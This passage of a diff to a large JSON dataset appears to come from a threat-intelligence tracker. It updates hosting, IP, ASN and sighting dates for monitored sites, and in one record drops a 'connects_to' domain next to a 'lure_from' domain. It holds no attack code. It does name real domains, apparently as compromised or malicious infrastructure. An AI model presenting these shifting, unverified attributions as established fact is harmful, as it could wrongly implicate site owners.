      "org": "AS28299 - LWSA S/A, BR",
      "first_seen": "2026-11-12",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "2804:10:8015::137:118",
+     "ip": "187.1.137.118",
      "asn": "AS28299",
      "org": "AS28299 - LWSA S/A, BR",
      "first_seen": "2026-11-12",
@@ -172664,7 +172499,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -172677,14 +172512,14 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.12",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.97.12",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -174315,20 +174150,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2a06:98c1:3121::3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "2a06:98c1:3121::3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "2a06:98c1:3121::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -175656,20 +175491,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -176297,20 +176132,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.44.253",
+   "ip": "172.67.206.214",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "104.21.44.253",
+     "ip": "172.67.206.214",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "172.67.206.214",
+     "ip": "104.21.44.253",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -183271,11 +183106,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.195.28",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
     {
      "ip": "172.67.195.28",
      "asn": "AS13335",
@@ -183288,13 +183130,6 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     }
    ],
@@ -197522,20 +197357,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -200933,6 +200768,13 @@
    "country": null,
    "ips": [
     {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
      "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
@@ -200941,13 +200783,6 @@
     },
     {
      "ip": "172.67.211.187",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -205972,14 +205807,14 @@
    "country": null,
    "ips": [
     {
-     "ip": "172.67.147.211",
+     "ip": "104.21.79.201",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.79.201",
+     "ip": "172.67.147.211",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -206034,6 +205869,13 @@
    "country": null,
    "ips": [
     {
+     "ip": "104.21.77.76",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
      "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
@@ -206041,7 +205883,7 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.77.76",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -206063,13 +205905,6 @@
     },
     {
      "ip": "2a06:98c1:3120::3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -219280,18 +219115,11 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2606:4700:3035::ac43:b04d",
+   "ip": "104.21.88.99",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
-    {
-     "ip": "2606:4700:3035::ac43:b04d",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "104.21.88.99",
      "asn": "AS13335",
@@ -219301,6 +219129,13 @@
     },
     {
      "ip": "172.67.176.77",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2606:4700:3035::ac43:b04d",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -221784,7 +221619,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.93.193",
+   "ip": "172.67.214.46",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -234089,18 +233924,11 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2a06:98c1:3121::3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
-    {
-     "ip": "2a06:98c1:3121::3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "188.114.96.3",
      "asn": "AS13335",
@@ -234109,14 +233937,21 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "2606:4700:3033::ac43:cf18",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "2606:4700:3033::ac43:cf18",
+     "ip": "2a06:98c1:3121::3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-27",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -238456,13 +238291,27 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "2a06:98c1:3120::3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
+     "ip": "172.67.223.167",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
      "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2a06:98c1:3120::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -238483,24 +238332,10 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "2a06:98c1:3120::3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "2a06:98c1:3121::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "172.67.223.167",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     }
    ],
@@ -238916,7 +238751,7 @@
    "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": null,
-   "url": "https://plshousing.org/",
+   "url": "https://plshousing.org/wp-cont",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -249067,23 +248902,23 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:44:9a:70cb:8daa:38ff:c38c",
+   "ip": "2a02:4780:84:634e:5913:e27e:5cf5:6e41",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
-   "country": "DE",
+   "country": "LT",
    "ips": [
-    {
-     "ip": "2a02:4780:44:9a:70cb:8daa:38ff:c38c",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
-     "first_seen": "2026-11-21",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "2a02:4780:84:634e:5913:e27e:5cf5:6e41",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2a02:4780:44:9a:70cb:8daa:38ff:c38c",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+     "first_seen": "2026-11-21",
      "last_seen": "2026-11-27"
     },
     {
@@ -265897,17 +265732,17 @@
    "country": null,
    "ips": [
     {
-     "ip": "172.67.194.100",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-17",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "104.21.20.203",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "172.67.194.100",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-17",
      "last_seen": "2026-11-27"
     },
     {
@@ -276485,11 +276320,25 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2a06:98c1:3120::3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2a06:98c1:3121::3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
     {
      "ip": "2a06:98c1:3120::3",
      "asn": "AS13335",
@@ -276505,21 +276354,7 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "2a06:98c1:3121::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -282864,14 +282699,14 @@
    "country": null,
    "ips": [
     {
-     "ip": "172.67.165.19",
+     "ip": "104.21.11.25",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.11.25",
+     "ip": "172.67.165.19",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -284351,25 +284186,11 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.193.217",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
-    {
-     "ip": "172.67.193.217",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "172.64.80.1",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "188.114.96.3",
      "asn": "AS13335",
@@ -284379,6 +284200,20 @@
     },
     {
      "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "172.67.193.217",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-27",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "172.64.80.1",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -285113,18 +284948,11 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2a06:98c1:3121::3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
-    {
-     "ip": "2a06:98c1:3121::3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "172.67.175.170",
      "asn": "AS13335",
@@ -285137,6 +284965,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-17",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2a06:98c1:3121::3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-27",
      "last_seen": "2026-11-27"
     },
     {
@@ -301335,11 +301170,25 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "2a06:98c1:3120::3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2a06:98c1:3120::3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
     {
      "ip": "188.114.97.3",
      "asn": "AS13335",
@@ -301362,21 +301211,7 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "2a06:98c1:3121::3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "2a06:98c1:3120::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -302701,7 +302536,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.7.159",
+   "ip": "172.67.136.241",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -303977,23 +303812,23 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:45:2235:36:abea:8da1:f606",
+   "ip": "2a02:4780:43:307b:3096:cca6:eb44:ed60",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
    "country": "DE",
    "ips": [
     {
-     "ip": "2a02:4780:45:2235:36:abea:8da1:f606",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
-     "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "2a02:4780:43:307b:3096:cca6:eb44:ed60",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2a02:4780:45:2235:36:abea:8da1:f606",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+     "first_seen": "2026-11-27",
      "last_seen": "2026-11-27"
     }
    ],
@@ -305581,23 +305416,23 @@
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.23.52",
+   "ip": "92.113.23.220",
    "asn": "AS47583",
    "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
    "country": "DE",
    "ips": [
     {
-     "ip": "92.113.23.52",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
-     "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "92.113.23.220",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "92.113.23.52",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+     "first_seen": "2026-11-27",
      "last_seen": "2026-11-27"
     }
    ],
@@ -306037,13 +305872,13 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "172.67.193.34",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -306057,7 +305892,7 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "172.67.193.34",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -313071,14 +312906,14 @@
    "country": null,
    "ips": [
     {
-     "ip": "172.67.137.165",
+     "ip": "104.21.78.218",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.78.218",
+     "ip": "172.67.137.165",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -318141,20 +317976,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -319867,20 +319702,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -319986,13 +319821,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.85.44",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
      "ip": "104.21.85.44",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "172.67.202.72",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -320014,13 +319856,6 @@
     },
     {
      "ip": "2a06:98c1:3120::c",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "172.67.202.72",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -322480,7 +322315,7 @@
    "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": null,
-   "url": "https://usedspares.co.za/",
+   "url": "https://usedspares.co.za/spare-keyword/jcb-3cx-camshaft/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -322676,18 +322511,11 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.32.248",
+   "ip": "2a06:98c1:3121::3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
-    {
-     "ip": "104.21.32.248",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "188.114.96.3",
      "asn": "AS13335",
@@ -322696,14 +322524,21 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "2a06:98c1:3121::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "2a06:98c1:3121::3",
+     "ip": "104.21.32.248",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -322986,8 +322821,7 @@
    ],
    "connects_to": [
     "t-trustrest.com",
-    "trek-72.com",
-    "xorados.com"
+    "trek-72.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -333829,20 +333663,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.219.181",
+   "ip": "104.21.38.63",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "172.67.219.181",
+     "ip": "104.21.38.63",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.38.63",
+     "ip": "172.67.219.181",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -337778,7 +337612,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.69.181",
+   "ip": "172.67.211.5",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -342505,20 +342339,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.165.251",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "172.67.165.251",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
+     "ip": "172.67.165.251",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -343115,20 +342949,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.44.96",
+   "ip": "172.67.198.132",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "104.21.44.96",
+     "ip": "172.67.198.132",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "172.67.198.132",
+     "ip": "104.21.44.96",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -345852,23 +345686,23 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "2a06:98c1:3121::3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "2a06:98c1:3121::3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
